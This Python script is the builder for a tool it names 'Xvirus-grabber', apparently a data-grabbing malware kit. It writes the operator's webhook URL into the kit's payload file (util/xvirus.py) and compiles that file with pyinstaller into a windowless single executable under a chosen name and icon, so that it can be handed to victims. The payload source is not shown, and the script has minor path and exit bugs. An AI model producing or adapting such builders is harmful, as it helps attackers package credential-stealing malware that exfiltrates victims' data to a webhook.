import time
import os
import sys
import shutil
from win10toast import ToastNotifier

os.system('title Xvirus-grabber Builder')
os.system("color b")
os.system("cls")

def main():
    webhook = input("[Enter your webhook URL]:> ")
    global search_text
    global replace_text
    search_text = "WEBHOOK_URL"
    replace_text = webhook
 
    try:
        with open(r'util/xvirus.py', 'r') as file:

            data = file.read()

            data = data.replace(search_text, replace_text)

        with open(r'util/xvirus.py', 'w') as file:

            file.write(data)

        print("[!] Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
        time.sleep(0.5)
        print(f"[*] This is the webhook you entered: {webhook}")
    except Exception:
        print("[?] Failed to write your webhook to the src. Make sure the code is correct and has not been changed.")
        time.sleep(0.5)
        print(f"[*] This is the webhook you entered: {webhook}")
    global file_name
    file_name = input("[Enter the name of the executable (File name)]:> ")
    time.sleep(1.5)

    print("[*] Starting to build your stub in 3 seconds...")
    time.sleep(3.0)
    print("[!] File compilation started well.")
    time.sleep(0.5)
    print("[*] Press CTRL + C to cancel, may break the application for future builds.")
    time.sleep(1.0)

    os.system(f"pyinstaller --noconsole --onefile -n {file_name} -i assets/icons/exe.ico util/xvirus.py")
    os.system("cls")

    global directory
    global toast
    directory = os.getcwd()
    toast = ToastNotifier()

    toast.show_toast(
        "Xvirus-grabber",
        "Your stub has been built!",
        duration = 25,
        icon_path = directory+"assets/icons/xvirus.ico",
        threaded = True,
    )

    path = directory+"/build/"+file_name
    path2 = directory+f"{file_name}.spec"
    dist = "/dist"

    try:
        shutil.rmtree(f"{directory}/build")
        os.remove(f"{file_name}.spec")
        print(f"[*] Successfully cleaned the folder and removed non-required/temporary files. ({path}, {path2})")
    except:
        print(f"[!] Couldn't delete temporary files. They have probably already been deleted.")

    time.sleep(1.0)

    try:
        with open(r'util/xvirus.py', 'r') as file:

            data = file.read()

            data = data.replace(replace_text, search_text)

        with open(r'util/xvirus.py', 'w') as file:

            file.write(data)

        print("[*] Successfully removed your webhook from the src for future builds.")
        time.sleep(0.5)
    except:
        print("[!] Failed to remove your webhook from the src. Make sure the code is correct and has not been changed.")
        time.sleep(0.5)

    try:
        path = directory + "/dist"
        path = os.path.realpath(path)
        os.startfile(path)
        print(f"[*] Opened the directory where {file_name}.exe is located.")
    except:
        print(f"[!] Couldn't open the directory where {file_name}.exe is located. Maybe is has been deleted or wasn't built correctly. I would still recommend you to check the following directory for {file_name}.exe: '{directory} + {dist}'")

    time.sleep(1.0)

    print(f"[*] Done. You can check the following directory, but the folder should have already been opened: [ {os.path.dirname(os.path.realpath(__file__))} ] for '{file_name}.exe'")
    time.sleep(0.5)
    print("[!] Exiting in 10 seconds...")
    time.sleep(10)
    main()


if __name__ == "__main__":
    main()
